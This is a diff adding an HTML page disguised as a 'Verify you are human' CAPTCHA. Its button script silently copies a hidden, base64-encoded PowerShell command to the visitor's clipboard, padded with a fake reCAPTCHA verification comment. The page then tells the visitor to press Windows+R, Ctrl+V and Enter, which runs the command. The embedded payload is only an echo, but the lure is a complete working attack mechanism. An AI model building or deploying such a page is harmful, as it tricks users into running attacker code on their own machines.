@@ -1,0 +1,14 @@
+<!doctype html><html><head><title>Verify you are human</title></head><body>
+<div class="verify-human"><h2>Verify you are human</h2>
+<p>Complete these verification steps to prove you are not a robot.</p>
+<p>Verification ID: 7F3A-2031</p>
+<ol><li>Press <b>Windows + R</b></li><li>Press <b>Ctrl + V</b></li><li>Press <b>Enter</b></li></ol>
+<button id="fixit" onclick="stageClipboard()">I'm not a robot ✅</button></div>
+<script>
+function setClipboardCopyData(t){navigator.clipboard.writeText(t);}
+function stageClipboard(){
+  const command = "powershell -w hidden -enc ZQBjAGgAbwAgAGgAaQA=";
+  const ploy = " # ✅ ''I am not a robot - reCAPTCHA Verification ID: 7F3A-2031''";
+  setClipboardCopyData(command + ploy);
+}
+</script></body></html>
